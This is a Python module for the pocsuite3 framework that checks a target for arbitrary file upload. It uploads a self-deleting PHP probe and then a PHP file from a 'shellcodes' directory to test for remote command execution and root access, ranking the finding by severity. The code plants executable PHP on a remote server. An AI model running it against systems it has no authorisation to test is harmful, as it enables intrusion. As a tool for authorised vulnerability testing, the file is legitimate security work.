import hashlib

from pocsuite3.lib.utils import random_str

from lib.utils import file2str


class judgeUpLoadFile:
    def __init__(self, upFileFunc, target_url, info):
        self.token = random_str()
        # upFileFunc要返回一个request的结果
        self.upFileFunc = upFileFunc
        self.target_url = target_url
        self.info = info

    def check(self):
        file_content_check = "<?php echo md5('{}');unlink(__FILE__);?>".format(self.token)
        r_shell = self.upFileFunc(self.target_url, file_content_check)

        # 如果有WAF就先上传简单的文件
        if r_shell.status_code == 200 and hashlib.new('md5', self.token.encode()).hexdigest() in str(r_shell.content):
            self.info['vulnable'] = 1
            self.info['LEVEL'] = '中危'

            filepath = 'shellcodes/data/php/uploadFile.php'
            file_content_exec = file2str(filepath)
            r_shell = self.upFileFunc(self.target_url, file_content_exec)

            if r_shell.status_code == 200:
                if 'YouExistRCE' in str(r_shell.content):
                    self.info['LEVEL'] = '高危'
                    if 'root' in str(r_shell.content):
                        # 执行系统命令并且是root权限
                        self.info['LEVEL'] = '严重'
                elif 'sensitiveInformation' in str(r_shell.content) or 'DangerFunc' in str(r_shell.content):
                    # 可上传文件执行php的函数phpinfo()，或者有危险函数未过滤，但是不能执行系统命令
                    self.info['LEVEL'] = '中危'
                else:
                    pass
        return self.info
